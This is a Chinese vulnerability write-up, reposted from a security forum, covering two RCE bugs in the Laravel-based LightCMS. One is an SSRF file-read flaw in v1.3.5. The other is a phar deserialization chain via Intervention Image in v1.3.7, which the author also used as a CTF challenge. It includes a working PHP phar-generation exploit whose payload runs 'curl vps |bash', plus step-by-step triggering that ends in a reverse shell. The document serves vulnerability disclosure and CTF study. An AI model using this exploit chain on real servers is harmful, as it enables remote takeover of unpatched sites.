> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9555)

> 先知社区，先知安全技术社区

前言
--

之前为了熟悉下 laravel，找了个基于 laravel 开发的 cms 审计练练手，瞄准了 lightcms。

先是挖到了一个比较简单的任意文件读取 & RCE 漏洞，提了 issue 被修复后又简单审计了一波，挖掘到了一个有意思的 RCE，感觉很适合 CTF，就拿来出题了，被用在了今年红帽杯的初赛。很遗憾由于放出题目时间较晚 + 很多 dalao 去打津门杯了，这道题只有两个队伍解出。

关于 lightcms 的简单介绍：

> `lightCMS`是一个轻量级的`CMS`系统，也可以作为一个通用的后台管理框架使用。`lightCMS`集成了用户管理、权限管理、日志管理、菜单管理等后台管理框架的通用功能，同时也提供模型管理、分类管理等`CMS`系统中常用的功能。

github 地址：[https://github.com/eddy8/LightCMS](https://github.com/eddy8/LightCMS)

v1.3.5 任意文件读取 & RCE 漏洞
----------------------

这个漏洞出在 `app/Http/Controllers/Admin/NEditorController.php`中的远程下载图片的功能：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510011337-e4caeb28-b0e9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510011337-e4caeb28-b0e9-1.png)  
这里简单使用了 `file_get_contents`来获取文件内容，并保存，所以我们可以使用 file 协议实现任意文件读取等 ssrf 操作。更危险的是这里的逻辑是取到的文件名后缀是什么，保存的就是什么后缀，所以我们可以放一个 php 一句话在服务器上，然后来请求，那么我们就可以 getshell。

具体可见 [https://github.com/eddy8/LightCMS/issues/19](https://github.com/eddy8/LightCMS/issues/19)

v1.3.7 RCE 漏洞
-------------

提了个 issue 后，作者也是及时进行了修复，分析下 patch 的操作，增加了一个 fetchImageFile 函数处理：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510011448-0ed118f2-b0ea-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510011448-0ed118f2-b0ea-1.png)  
跟进分析 fetchImageFile：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510011501-16b3ec20-b0ea-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510011501-16b3ec20-b0ea-1.png)  
可以看到使用了 curl 来获取远程资源的内容，然后使用 Image:make 模块进行解析。并且对后缀也进行了严格的过滤。同时这个 cms 大多都是数据库操作，涉及文件操作少之又少，看起来是无法直接 RCE 的。

laravel 框架开发我自然联想到了反序列化，并且这个 cms 后台还是有图片上传功能的，能不能利用 phar 反序列化实现 RCE 呢？

### POP 链

正式版本 Laravel 版本是 6.20.16，测试发现 5.8 版本利用 `dispatch`方法的 RCE 链在 6.20.16 版本可以使用。经过测试 7.x 版本也可以使用这条链。[这篇文章](https://www.anquanke.com/post/id/231079)分析到了 laravel 8 的链子，不过多赘述了。

### 文件上传

有了 RCE 链，我们需要将 phar 文件传上去。patch 过的远程下载图片功能，使用了`Intervention\Image\Facades\Image`库来进行图片解析，对文件内容检查较为严格，但是本地图片上传处较为松散，使用一般的添加 GIF 文件头的方法就可以成功上传。

### 触发点

最后一步也就是相对困难的一步，需要找到触发 phar 的点，即我们可控的一个文件处理函数。其实前面提到了这个 cms 并没有太多文件操作。  
注意到修复代码 `fetchImageFile`函数存在如下操作：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510011635-4ed80a28-b0ea-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510011635-4ed80a28-b0ea-1.png)  
在获取到远程 url 的内容后，会调用 `Intervention\Image\Facades\Image`的 `make`方法，对图片内容进行解析。

看到这里我隐约想起之前见过 `Image:make($url)`这种用法，那么这里的 url 能不能有类似 file_get_content 之类的文件操作呢？

跟进，会跳到 `vendor/intervention/image/src/Intervention/Image/AbstractDecoder.php`中 `AbstractDecoder`类的 `init`方法，判断数据类型：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510011707-62188d92-b0ea-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510011707-62188d92-b0ea-1.png)  
可以看到 data 不仅可以是图片的二进制数据 ，还可以是这些数据格式，跟进 `initFromUrl`方法：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510011740-7532749c-b0ea-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510011740-7532749c-b0ea-1.png)  
非常明显的 file_get_contents，那么最后触发点的问题也解决了，我们可以在 vps 上放置一个 txt 文件，内容为 `phar://./upload/xxx`，然后让服务器来取这个文件，即可触发反序列化。

### RCE 流程

首先生成 phar 文件:

```
<?php

namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }

    }

    class BroadcastEvent
    {
      protected $connection;

      public function __construct($connection)
      {
        $this->connection = $connection;
      }
    }

}

namespace Illuminate\Bus{
    class Dispatcher{
        protected $queueResolver;

        public function __construct($queueResolver)
        {
          $this->queueResolver = $queueResolver;
        }

    }
}

namespace{
    $command = new Illuminate\Broadcasting\BroadcastEvent('curl vps |bash');

    $dispater = new Illuminate\Bus\Dispatcher("system");

    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);
    $phar = new Phar('phar.phar');
    $phar -> stopBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); 
    $phar -> addFromString('test.txt','test');
    $phar -> setMetadata($PendingBroadcast);
    $phar -> stopBuffering();
    rename('phar.phar','phar.jpg');

}
```

在后台添加文章处上传图片：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510011843-9ae9bcc2-b0ea-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510011843-9ae9bcc2-b0ea-1.png)  
得到文件路径 `upload/image/202102/AciwTtmKQ7IQN4gdeoiZ6ve4A0LSK48SGJGk38df.gif`。  
在 vps 上放置一个文件，内容为 `phar://./upload/image/202102/AciwTtmKQ7IQN4gdeoiZ6ve4A0LSK48SGJGk38df.gif`，让服务器来取这个文件：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510011923-b325f648-b0ea-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510011923-b325f648-b0ea-1.png)  
可以反弹 shell：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210510011939-bc74c4b8-b0ea-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210510011939-bc74c4b8-b0ea-1.png)

总结
--

这个漏洞虽然利用起来并不算复杂，但是 phar 触发点相对隐秘一些，不容易被发现，这个操作也是之前没有见过的（感觉很适合 CTF 2333），还是挺有趣的，只可惜感觉打的人不太多。